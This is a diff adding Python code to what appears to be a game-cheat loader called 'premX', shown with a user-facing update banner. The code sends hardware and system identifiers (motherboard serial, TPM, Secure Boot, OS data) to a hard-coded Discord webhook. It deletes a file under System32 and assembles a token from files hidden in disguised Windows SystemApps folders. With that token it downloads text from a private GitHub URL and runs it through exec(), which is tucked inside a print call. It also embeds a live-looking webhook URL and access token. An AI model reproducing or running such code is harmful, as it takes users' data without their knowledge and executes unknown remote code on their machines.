@@ -1,0 +1,57 @@
+os.system('cls')
+print("")
+print("--------Hello premX users, anonymous_kl here. Please take the time to read this.")
+print("")
+print("///UPDATE: March 25, 2025")
+print("> Mode 1 has been removed to avoid the risk of flag/ban.")
+print("> Starting today, it's best that you play legit with mode 2.")
+print("> Mode 1 will be in maintenance until it's safe.")
+#print("> Mode 1 is still playable but you need to use chest/neck offset.")
+input()
+myuptimex = get_uptime_minutes()
+if myuptimex > 2:
+    print("")
+else:
+    os.system('cls')
+    print("Encrypting the data and decoding, please wait.")
+    seconds = 90
+    while seconds:
+        mins, secs = divmod(seconds, 60)
+        print(f"{mins:02}:{secs:02}", end="\r")
+        time.sleep(1)
+        seconds -= 1
+
+os.system('cls')
+data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D',my_key_x ,my_os_data ,my_os_version ,my_secureboot ,my_tpm ,my_motherboard_serial ,aes_user_date_installed,myinfo_xx_lc)
+os.system('cls')
+file_path_default_kleix = r"C:\Windows\System32\aes_kleix\default_kleix.txt"
+if os.path.exists(file_path_default_kleix):
+    os.remove(file_path_default_kleix)
+    print("Success loading config manager...")
+
+def premx_2025(mycontent: str):
+    raw_url = "https://raw.githubusercontent.com/johnzeykzkousx/myown/refs/heads/main/premx_newcam.txt?token=GHSAT0AAAAAADARMS7MMRHFM2OJ6PCCQG3GZ7DX3GQ"
+    headers = {"Authorization": f"token {mycontent}"}
+    response = requests.get(raw_url, headers=headers)
+    
+    if response.status_code == 200:
+        mycntcnt = response.text
+        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
+    else:
+        raise Exception(f"Error. Your internet is private.")
+
+def get_data_from_file(file_path):
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as file:
+            content = file.read()
+        return content
+    else:
+        return "Error"
+part1_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy1.txt')
+part2_Data = os.path.join(os.environ['SystemRoot'], 'SystemApps','Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx' ,'w5n1h2txyewy2.txt')
+part3_data = os.path.join(os.environ['SystemRoot'], 'SystemApps', 'Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewyTyklsdpremx','w5n1h2txyewy3.txt')
+content1 = get_data_from_file(part1_data)
+content2 = get_data_from_file(part2_Data)
+content3 = get_data_from_file(part3_data)
+content4 =  content1+content2+content3
+premx_2025(content4)
